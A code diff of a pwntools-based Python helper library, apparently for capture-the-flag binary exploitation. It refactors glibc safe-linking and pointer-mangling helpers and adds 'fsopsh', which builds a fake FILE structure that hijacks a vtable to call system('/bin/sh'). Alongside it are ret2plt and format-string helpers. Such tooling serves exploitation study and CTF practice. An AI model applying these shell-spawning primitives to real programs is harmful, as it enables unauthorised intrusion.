@@ -1,7 +1,8 @@
 from pwn import *
 import pwn
 import re
-from io import *
+import math
+from pwninit.io import *
 
 class PwnContext:    
     def __init__(self, conn, elf, libc, binary, prefix, offset, canary):
@@ -12,30 +13,6 @@ class PwnContext:
         self.prefix = prefix
         self.offset = offset
         self.canary = canary
-    
-    def getb(self, d, a, b):
-        a_ = d.find(a)
-        if a_ == -1 or a == b"": a_ = 0
-        b_ = d.find(b, a_+len(a))
-        if b_ == -1 or b == b"": b_ = len(d)
-        return d[a_+len(a):b_]
-
-    def getr(self, d, p):
-        return re.findall(p, d)[0]
-        
-    def safelink_bf64(self, ptr):
-        fd = 0
-        for i in range(36, -1, -12):
-            tmp = fd
-            fd <<= 12
-            fd |= (tmp ^ (ptr >> i)) & 0xfff
-        if fd & 0xf != 0:
-            log.warn("safelink bf page differs")
-        return fd
-
-    def printx(self, **kwargs):
-        for k, v in kwargs.items():
-            log.success("%s: %#x" % (k, v))  
 
     def resolve(self, symbol, base=None):
         """Resolve a symbol to an address, with optional offset notation (e.g., 'main+0x10')"""
@@ -52,11 +29,6 @@ class PwnContext:
         else:
             addr = base.sym[symbol]
         return addr
-
-    def hexdump(self, data, s=context.word_size//8):
-        idx_max = ceil(log(len(data)/s, 16))
-        for i, c in enumerate(sliced(data, s)):
-            info(f"%0{idx_max}x: %#0{2*s+2}x" % (i, u64(c)))
     
     def leak(self, leak, leaked=0):
         start = leak.find(b'0x')
@@ -199,20 +171,26 @@ class PwnContext:
         info(f"format string : {output}")
         return output.index("0x" + "41" * context.bytes)
 
-    def safelink(self, addr, ptr):
-        return (addr >> 12) ^ ptr
-
-    def ptr_mangle(self, addr, cookie=0):
-        return rol(addr ^ cookie, 17)
-
-    def ptr_demangle(self, addr, cookie=0):
-        return ror(addr, 17) ^ cookie
-
-    def ptr_cookie(self, mangled, demangled):
-        return self.ptr_demangle(mangled, demangled)
-
     def binsh(self):
         return next(self.libc.search(b"/bin/sh\0"))
+    
+    def fsopsh(self, func=None, arg=b"/bin/sh\0", lock=None):
+        if self.elf.bits != 64:
+            raise NotImplementedError()
+
+        func = func or self.libc.sym.system
+        lock = lock or self.libc.sym["_IO_2_1_stdout_"] + 0x200
+
+        return flat({
+            0x00: [0x3b01010101010101, arg],
+            0x78: -1,
+            0x88: lock, # empty zone as lock
+            0x90: -1,
+            0xa0: self.libc.sym["_IO_2_1_stdout_"] + (0xe0 - 0xe0), # wide_data
+            0xd0: func,
+            0xd8: self.libc.sym["_IO_wfile_jumps"] - 0x20, # vtable
+            0xe0: self.libc.sym["_IO_2_1_stdout_"] + (0xe0 - 0xe0) + (0xd0 - 0x68), # wide_data->vtable,
+        }, filler=b"\0")
 
 # Global instance
 ctx = None
@@ -224,13 +202,6 @@ def set_ctx(new_ctx: PwnContext):
 def _require_ctx():
     if ctx is None:
         raise RuntimeError("PwnContext not initialized (call set_ctx first)")
-
-getb = lambda *a, **k: (_require_ctx(), ctx.getb(*a, **k))[1]
-getr = lambda *a, **k: (_require_ctx(), ctx.getr(*a, **k))[1]
-
-safelink_bf64 = lambda *a, **k: (_require_ctx(), ctx.safelink_bf64(*a, **k))[1]
-printx = lambda *a, **k: (_require_ctx(), ctx.printx(*a, **k))[1]
-hexdump = lambda *a, **k: (_require_ctx(), ctx.hexdump(*a, **k))[1]
 
 leak = lambda *a, **k: (_require_ctx(), ctx.leak(*a, **k))[1]
 resolve = lambda *a, **k: (_require_ctx(), ctx.resolve(*a, **k))[1]
@@ -247,15 +218,52 @@ ret2plt = lambda *a, **k: (_require_ctx(), ctx.ret2plt(*a, **k))[1]
 
 format_string = lambda *a, **k: (_require_ctx(), ctx.format_string(*a, **k))[1]
 
-safelink = lambda *a, **k: (_require_ctx(), ctx.safelink(*a, **k))[1]
-ptr_mangle = lambda *a, **k: (_require_ctx(), ctx.ptr_mangle(*a, **k))[1]
-ptr_demangle = lambda *a, **k: (_require_ctx(), ctx.ptr_demangle(*a, **k))[1]
-ptr_cookie = lambda *a, **k: (_require_ctx(), ctx.ptr_cookie(*a, **k))[1]
-
 binsh = lambda *a, **k: (_require_ctx(), ctx.binsh(*a, **k))[1]
+fsopsh = lambda *a, **k: (_require_ctx(), ctx.fsopsh(*a, **k))[1]
 
 # Utility functions
 u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
 u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
 u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
 upack = lambda d: pwn.unpack(d, "all")
+
+def getb(d, a, b):
+    a_ = d.find(a)
+    if a_ == -1 or len(a) == 0: a_ = 0
+    b_ = d.find(b, a_+len(a))
+    if b_ == -1 or len(b) == 0: b_ = len(d)
+    return d[a_+len(a):b_]
+
+def getr(d, p):
+    return re.findall(p, d)[0]
+    
+def safelink_bf64(ptr):
+    fd = 0
+    for i in range(36, -1, -12):
+        tmp = fd
+        fd <<= 12
+        fd |= (tmp ^ (ptr >> i)) & 0xfff
+    if fd & 0xf != 0:
+        log.warn("safelink bf page differs")
+    return fd
+
+def printx(**kwargs):
+    for k, v in kwargs.items():
+        log.success("%s: %#x" % (k, v))
+
+def hexdump(data, s=context.word_size//8):
+    idx_max = math.ceil(math.log(len(data), 16))
+    for i in range(0, len(data), s):
+        info(f"%0{idx_max}x: %#0{2*s+2}x" % (i, u64(data[i:i+s])))
+
+def safelink(addr, ptr):
+        return (addr >> 12) ^ ptr
+
+def ptr_mangle(addr, cookie=0):
+    return rol(addr ^ cookie, 17)
+
+def ptr_demangle(addr, cookie=0):
+    return ror(addr, 17) ^ cookie
+
+def ptr_cookie(mangled, demangled):
+    return ptr_demangle(mangled, demangled)
